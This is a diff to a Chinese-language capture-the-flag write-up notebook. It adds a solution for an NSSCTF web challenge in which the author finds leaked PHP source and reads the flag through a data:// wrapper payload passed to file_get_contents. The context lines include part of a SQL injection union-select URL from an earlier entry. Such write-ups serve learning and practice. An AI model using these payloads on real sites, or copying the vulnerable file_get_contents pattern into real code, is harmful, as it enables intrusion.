@@ -365,5 +365,36 @@ http://node5.anna.nssctf.cn:24324/?id=-1)))))) union select 1,group_concat(colum
 ![alt text](image-154.png)
 得到falg
 
+## [GDOUCTF 2023]泄露的伪装
+>url:https://www.nssctf.cn/problem/3700
+>知识点：php伪协议
 
+直接用随波逐流扫描目录
+![alt text](image-161.png)
+一个一个试过去，到test.txt，得到一段php代码
+```php
+<?php
+error_reporting(0);
+if(isset($_GET['cxk'])){
+    $cxk=$_GET['cxk'];
+    if(file_get_contents($cxk)=="ctrl"){
+        echo $flag;
+    }else{
+        echo "娲楁礂鐫″惂";
+    }
+}else{
+    echo "nononoononoonono";
+}
+?>
+```
+这里主要需要理解file_get_contents函数
+构造cxk参数使其指向内容为"ctrl"的资源，用data协议可以将内容写入
+构造payload：
+```
+http://node5.anna.nssctf.cn:24082/orzorz.php?cxk=data://text/plain,ctrl
+```
+![alt text](image-162.png)
 
+## [UUCTF 2022 新生赛]ez_rce
+>url:https://www.nssctf.cn/problem/3090
+>知识点：RCE
